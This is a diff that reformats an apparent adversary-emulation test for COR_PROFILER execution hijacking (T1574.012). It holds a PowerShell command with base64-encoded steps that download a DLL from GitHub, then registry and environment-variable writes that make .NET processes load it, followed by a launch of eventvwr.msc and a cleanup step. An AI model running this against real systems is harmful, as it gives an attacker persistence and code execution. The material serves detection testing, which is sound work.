@@ -1,4 +1,4 @@
-- id: bdc7327a-16ca-5f1d-a907-d9a7b13f70a1
+- requirements: []
   name: Soumaia ART Tests - User scope COR_PROFILER
   description: 'Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
 
@@ -13,24 +13,16 @@
 
     Reference: https://redcanary.com/blog/cor_profiler-for-persistence/'
   tactic: stealth
-  technique:
-    attack_id: T1574.012
-    name: 'Hijack Execution Flow: COR_PROFILER'
-  platforms:
-    windows:
-      psh:
-        command: |-
-          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQA1ADcANAAuADAAMQAyAHgANgA0AC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==
-          if ($LASTEXITCODE -ne 0) {
-              powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEANQA3ADQALgAwADEAMgB4ADYANAAuAGQAbABsACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA3ADQALgAwADEAMgAvAGIAaQBuAC8AVAAxADUANwA0AC4AMAAxADIAeAA2ADQALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADUANwA0AC4AMAAxADIAeAA2ADQALgBkAGwAbAAiAAoA
-          }
-          Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan
-          New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value ".\T1574.012x64.dll" -Force | Out-Null
-          New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null
-          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null
-          New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value ".\T1574.012x64.dll" -Force | Out-Null
-          Write-Host "executing eventvwr.msc" -ForegroundColor Cyan
-          START MMC.EXE EVENTVWR.MSC
-        cleanup: "Remove-Item -Path \"HKCU:\\Software\\Classes\\CLSID\\{09108e71-974c-4010-89cb-acf471ae9e2c}\" -Recurse -Force -ErrorAction Ignore \nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_ENABLE_PROFILING\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER\" -Force -ErrorAction Ignore | Out-Null\nRemove-ItemProperty -Path HKCU:\\Environment -Name \"COR_PROFILER_PATH\" -Force -ErrorAction Ignore | Out-Null"
-        payloads:
-        - T1574.012x64.dll
+  technique_id: T1574.012
+  technique_name: 'Hijack Execution Flow: COR_PROFILER'
+  executors:
+  - cleanup:
+    - Remove-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -Recurse -Force -ErrorAction Ignore; Remove-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null; Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
+    timeout: 60
+    platform: windows
+    name: psh
+    payloads:
+    - T1574.012x64.dll
+    parsers: []
+    command: powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIALgBcAFQAMQA1ADcANAAuADAAMQAyAHgANgA0AC4AZABsAGwAIgApACAAewBlAHgAaQB0ACAAMAB9ACAAZQBsAHMAZQAgAHsAZQB4AGkAdAAgADEAfQAKAA==; if ($LASTEXITCODE -ne 0) { powershell -NoProfile -EncodedCommand TgBlAHcALQBJAHQAZQBtACAALQBUAHkAcABlACAARABpAHIAZQBjAHQAbwByAHkAIAAoAHMAcABsAGkAdAAtAHAAYQB0AGgAIAAiAC4AXABUADEANQA3ADQALgAwADEAMgB4ADYANAAuAGQAbABsACIAKQAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAaQBnAG4AbwByAGUAIAB8ACAATwB1AHQALQBOAHUAbABsAAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBkAGMAYQBuAGEAcgB5AGMAbwAvAGEAdABvAG0AaQBjAC0AcgBlAGQALQB0AGUAYQBtAC8AcgBhAHcALwBtAGEAcwB0AGUAcgAvAGEAdABvAG0AaQBjAHMALwBUADEANQA3ADQALgAwADEAMgAvAGIAaQBuAC8AVAAxADUANwA0AC4AMAAxADIAeAA2ADQALgBkAGwAbAAiACAALQBPAHUAdABGAGkAbABlACAAIgAuAFwAVAAxADUANwA0AC4AMAAxADIAeAA2ADQALgBkAGwAbAAiAAoA }; Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}" -ForegroundColor Cyan; New-Item -Path "HKCU:\Software\Classes\CLSID\{09108e71-974c-4010-89cb-acf471ae9e2c}\InprocServer32" -Value ".\T1574.012x64.dll" -Force | Out-Null; New-ItemProperty -Path HKCU:\Environment -Name "COR_ENABLE_PROFILING" -PropertyType String -Value "1" -Force | Out-Null; New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -PropertyType String -Value "{09108e71-974c-4010-89cb-acf471ae9e2c}" -Force | Out-Null; New-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -PropertyType String -Value ".\T1574.012x64.dll" -Force | Out-Null; Write-Host "executing eventvwr.msc" -ForegroundColor Cyan; START MMC.EXE EVENTVWR.MSC
+  id: bdc7327a-16ca-5f1d-a907-d9a7b13f70a1
